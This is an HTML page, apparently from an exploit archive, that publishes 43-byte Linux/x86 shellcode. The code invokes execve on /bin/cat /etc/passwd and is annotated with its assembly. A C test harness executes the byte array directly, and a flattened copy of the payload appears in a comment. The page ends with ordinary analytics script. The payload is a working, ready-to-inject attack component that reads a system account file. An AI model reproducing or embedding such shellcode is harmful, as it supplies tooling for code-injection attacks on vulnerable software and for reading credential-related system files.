<html><head><title>Linux/x86 - bin/cat /etc/passwd - 43 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#include &lt;stdio.h&gt;
 
const char shellcode[]=&quot;\x31\xc0&quot; // xorl %eax,%eax
&quot;\x99&quot; // cdq
&quot;\x52&quot; // push edx
&quot;\x68\x2f\x63\x61\x74&quot; // push dword 0x7461632f
&quot;\x68\x2f\x62\x69\x6e&quot; // push dword 0x6e69622f
&quot;\x89\xe3&quot; // mov ebx,esp
&quot;\x52&quot; // push edx
&quot;\x68\x73\x73\x77\x64&quot; // pu sh dword 0x64777373
&quot;\x68\x2f\x2f\x70\x61&quot; // push dword 0x61702f2f
&quot;\x68\x2f\x65\x74\x63&quot; // push dword 0x6374652f
&quot;\x89\xe1&quot; // mov ecx,esp
&quot;\xb0\x0b&quot; // mov $0xb,%al
&quot;\x52&quot; // push edx
&quot;\x51&quot; // push ecx
&quot;\x53&quot; // push ebx
&quot;\x89\xe1&quot; // mov ecx,esp
&quot;\xcd\x80&quot; ; // int 80h
 
int main()
{
(*(void (*)()) shellcode)();
 
return 0;
}
 
 
/*
shellcode[]=	&quot;\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64&quot; 
		&quot;\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80&quot;;
*/

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
